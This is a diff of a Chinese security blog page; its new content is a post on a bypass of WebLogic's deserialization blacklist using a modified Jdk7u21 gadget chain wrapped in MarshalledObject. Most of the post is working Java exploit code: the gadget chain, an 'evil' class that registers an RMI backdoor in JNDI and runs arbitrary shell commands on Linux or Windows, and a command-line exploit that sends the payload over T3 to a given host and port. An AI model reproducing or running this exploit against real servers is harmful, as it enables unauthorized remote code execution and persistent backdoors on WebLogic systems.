@@ -6,17 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: java反序列化分析 | huahua&#39;s Blog</title>
+  <title>Jdk7u21新链(hw爆出) | huahua&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Java RedTeam C2">
-<meta property="og:type" content="website">
-<meta property="og:title" content="huahua&#39;s Blog">
-<meta property="og:url" content="http://example.com/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/index.html">
+  <meta name="description" content="前言hw爆出的weblogic Jdk7u21绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jdk7u21新链(hw爆出)">
+<meta property="og:url" content="http://example.com/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/index.html">
 <meta property="og:site_name" content="huahua&#39;s Blog">
-<meta property="og:description" content="Java RedTeam C2">
+<meta property="og:description" content="前言hw爆出的weblogic Jdk7u21绕过">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/image-20210506135552411.png">
+<meta property="og:image" content="http://example.com/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/image-20210506135912300.png">
+<meta property="article:published_time" content="2021-05-06T05:48:14.000Z">
+<meta property="article:modified_time" content="2021-05-06T07:01:44.043Z">
 <meta property="article:author" content="huahua">
+<meta property="article:tag" content="Weblogic相关">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/image-20210506135552411.png">
   
     <link rel="alternative" href="/atom.xml" title="huahua&#39;s Blog" type="application/atom+xml">
   
@@ -152,60 +158,188 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="weblogic-Jdk7u21新链-hw爆出" class="article article-type-weblogic " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/05/01/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2021-05-01T08:14:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-01</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/01/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">shiro550反序列化分析</a>
+    <h1 class="article-title" itemprop="name">
+      Jdk7u21新链(hw爆出)
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/" class="archive-article-date">
+  	<time datetime="2021-05-06T05:48:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>hw爆出的weblogic Jdk7u21绕过</p>
+<span id="more"></span>
+
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>weblogicNewJdk7u21.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">package com;</span><br><span class="line"></span><br><span class="line">import util.Gadgets;</span><br><span class="line">import util.Reflections;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.rmi.MarshalledObject;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.LinkedHashSet;</span><br><span class="line"></span><br><span class="line">public class weblogicNewJdk7u21 &#123;</span><br><span class="line">    public Object getObject(String command) throws Exception&#123;</span><br><span class="line">        Jdk7u21 jdk7u21&#x3D;new Jdk7u21();</span><br><span class="line">        Object object &#x3D;jdk7u21.getObject(command);</span><br><span class="line">        ByteArrayOutputStream bos&#x3D;new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream&#x3D;new ObjectOutputStream(bos);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        byte[] bytesCode&#x3D;bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        Object marshalledObject&#x3D;Reflections.getFirstCtor(MarshalledObject.class.getName()).newInstance(bytesCode);</span><br><span class="line">        Reflections.setFieldValue(marshalledObject, &quot;objBytes&quot;, bytesCode);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;;</span><br><span class="line"></span><br><span class="line">        HashMap map &#x3D; new HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, &quot;foo&quot;);</span><br><span class="line"></span><br><span class="line">        InvocationHandler tempHandler &#x3D; (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">        Reflections.setFieldValue(tempHandler, &quot;type&quot;, MarshalledObject.class);</span><br><span class="line">        Object proxy &#x3D; Gadgets.createProxy(tempHandler, Override.class);</span><br><span class="line"></span><br><span class="line">        LinkedHashSet set &#x3D; new LinkedHashSet(); &#x2F;&#x2F; maintain order</span><br><span class="line">        set.add(marshalledObject);</span><br><span class="line">        set.add(proxy);</span><br><span class="line">        map.put(zeroHashCodeStr, marshalledObject); &#x2F;&#x2F; swap in real object</span><br><span class="line"></span><br><span class="line">        return set;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Jdk7u21.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package com;</span><br><span class="line"></span><br><span class="line">import util.Gadgets;</span><br><span class="line">import util.Reflections;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.LinkedHashSet;</span><br><span class="line"></span><br><span class="line">public class Jdk7u21 &#123;</span><br><span class="line">    public Object getObject(String command) throws Exception&#123;</span><br><span class="line">        final Object templates &#x3D; Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">        String zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;;</span><br><span class="line"></span><br><span class="line">        HashMap map &#x3D; new HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, &quot;foo&quot;);</span><br><span class="line"></span><br><span class="line">        InvocationHandler tempHandler &#x3D; (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">        Reflections.setFieldValue(tempHandler, &quot;type&quot;, Templates.class);</span><br><span class="line">        Templates proxy &#x3D; Gadgets.createProxy(tempHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">        LinkedHashSet set &#x3D; new LinkedHashSet(); &#x2F;&#x2F; maintain order</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(templates, &quot;_auxClasses&quot;, null);</span><br><span class="line">        Reflections.setFieldValue(templates, &quot;_class&quot;, null);</span><br><span class="line"></span><br><span class="line">        map.put(zeroHashCodeStr, templates); &#x2F;&#x2F; swap in real object</span><br><span class="line"></span><br><span class="line">        return set;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Jdk7u21为ysoserial原始版本的gadgat，weblogicNew7u21为绕过的gadgat。</p>
+<p>jdk7u21原链在var5.invoke处，调用最终结果为调用了TemplatesImpl的newTransformer，因此触发了命令执行</p>
+<p><img src="/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/image-20210506135552411.png" alt="image-20210506135552411"></p>
+<p>weblogic黑名单过滤从FilteredObjectInputStream开始，如果从中间能跳脱出不适用FilteredObjectInputStream进行反序列化即可绕过黑名单限制。</p>
+<p>最终找到一个名为MarshalledObject的类，我们调用MarshalledObject的get方法可以达到之前的效果。剩下的工作为改造Jdk7u21的链，最终改造结果为开头的代码。</p>
+<p><img src="/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/image-20210506135912300.png" alt="image-20210506135912300"></p>
+<h3 id="编写回显的exp"><a href="#编写回显的exp" class="headerlink" title="编写回显的exp"></a>编写回显的exp</h3><p>主要为寻找一个类，其继承Remote抛出RemoteException异常，最终找到RMIRemoteCommandConnection这个类，该类的executeCommand方法接受了一个Command对象，返回值为一个Object。Command对象中存在一个String的成员，因此可以用这个String对象存放需要执行的命令，然后把返回结果作为Object返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">package com;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import oracle.toplink.internal.remotecommand.rmi.RMIRemoteCommandConnection;</span><br><span class="line">import oracle.toplink.remotecommand.Command;</span><br><span class="line"></span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class evil  extends AbstractTranslet implements RMIRemoteCommandConnection &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String bindName &#x3D; &quot;neogogogo1&quot;;</span><br><span class="line">            Context ctx &#x3D; new InitialContext();</span><br><span class="line">            evil evil&#x3D;new evil();</span><br><span class="line">            ctx.rebind(bindName, evil);</span><br><span class="line">        &#125; catch (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public Object executeCommand(Command command) throws RemoteException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String cmd&#x3D;command.getServiceId().getId();</span><br><span class="line"></span><br><span class="line">            boolean isLinux &#x3D; true;</span><br><span class="line">            String osTyp &#x3D; System.getProperty(&quot;os.name&quot;);</span><br><span class="line">            if (osTyp !&#x3D; null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">                isLinux &#x3D; false;</span><br><span class="line">            &#125;</span><br><span class="line">            List&lt;String&gt; cmds &#x3D; new ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">            if (isLinux) &#123;</span><br><span class="line">                cmds.add(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">                cmds.add(&quot;-c&quot;);</span><br><span class="line">                cmds.add(cmd);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                cmds.add(&quot;cmd.exe&quot;);</span><br><span class="line">                cmds.add(&quot;&#x2F;c&quot;);</span><br><span class="line">                cmds.add(cmd);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ProcessBuilder processBuilder &#x3D; new ProcessBuilder(cmds);</span><br><span class="line">            processBuilder.redirectErrorStream(true);</span><br><span class="line">            Process proc &#x3D; processBuilder.start();</span><br><span class="line"></span><br><span class="line">            BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(proc.getInputStream()));</span><br><span class="line">            StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                sb.append(line).append(&quot;\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return sb.toString();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>main函数的类内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">package com;</span><br><span class="line"></span><br><span class="line">import oracle.toplink.internal.remotecommand.ConnectToHostCommand;</span><br><span class="line">import oracle.toplink.internal.remotecommand.rmi.RMIRemoteCommandConnection;</span><br><span class="line">import oracle.toplink.remotecommand.Command;</span><br><span class="line">import oracle.toplink.remotecommand.ServiceId;</span><br><span class="line">import util.Gadgets;</span><br><span class="line">import util.Reflections;</span><br><span class="line">import weblogic.Serializables;</span><br><span class="line">import weblogic.T3ProtocolOperation;</span><br><span class="line">import weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line">import weblogic.jndi.Environment;</span><br><span class="line"></span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.LinkedHashSet;</span><br><span class="line"></span><br><span class="line">public class main &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line">        if(args.length&lt;3)&#123;</span><br><span class="line">            System.out.println(&quot;By huahua&quot;);</span><br><span class="line">            System.out.println(&quot;java -jar exp.jar host port command&quot;);</span><br><span class="line">            System.exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">        String host&#x3D;args[0];</span><br><span class="line">        String port&#x3D;args[1];</span><br><span class="line">        String cmd&#x3D;args[2];</span><br><span class="line">        weblogicNewJdk7u21 weblogicNewJdk7u21&#x3D;new weblogicNewJdk7u21();</span><br><span class="line">        Object object&#x3D;weblogicNewJdk7u21.getObject(&quot;touch &#x2F;tmp&#x2F;huahua666&quot;);</span><br><span class="line">        byte[] exp&#x3D; Serializables.serialize(object);</span><br><span class="line">&#x2F;&#x2F;        T3ProtocolOperation.send(&quot;192.168.232.129&quot;,&quot;7001&quot;,exp);</span><br><span class="line">        try &#123;</span><br><span class="line">            Context initialContext &#x3D; getInitialContext(converUrl(host, &quot;7001&quot;));</span><br><span class="line">            RMIRemoteCommandConnection remoteCode &#x3D; (RMIRemoteCommandConnection) initialContext.lookup(&quot;neogogogo1&quot;);</span><br><span class="line">            ServiceId serviceId&#x3D;new ServiceId(null,cmd,null);</span><br><span class="line">            Command command&#x3D;new ConnectToHostCommand();</span><br><span class="line">            command.setServiceId(serviceId);</span><br><span class="line">            Object result&#x3D;remoteCode.executeCommand(command);</span><br><span class="line">            System.out.println(result);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            T3ProtocolOperation.send(host,port,exp);</span><br><span class="line">            System.out.println(&quot;rmi installed，请再次执行命令！(如果该提示出现两次或以上，则表示目标无此漏洞)&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Context getInitialContext(String url) throws NamingException, FileNotFoundException &#123;</span><br><span class="line">        Environment environment &#x3D; new Environment();</span><br><span class="line">        environment.setProviderUrl(url);</span><br><span class="line">        environment.setEnableServerAffinity(false);</span><br><span class="line">&#x2F;&#x2F;        environment.setSSLClientTrustManager(new WeblogicTrustManager());</span><br><span class="line">        return environment.getInitialContext();</span><br><span class="line">    &#125;</span><br><span class="line">    public static String converUrl(String host, String port) &#123;</span><br><span class="line">        return &quot;t3:&#x2F;&#x2F;&quot; + host + &quot;:&quot; + port;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>无</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">java反序列化分析</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Weblogic相关</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ysoserial学习之Jdk7u21</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -228,9 +362,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
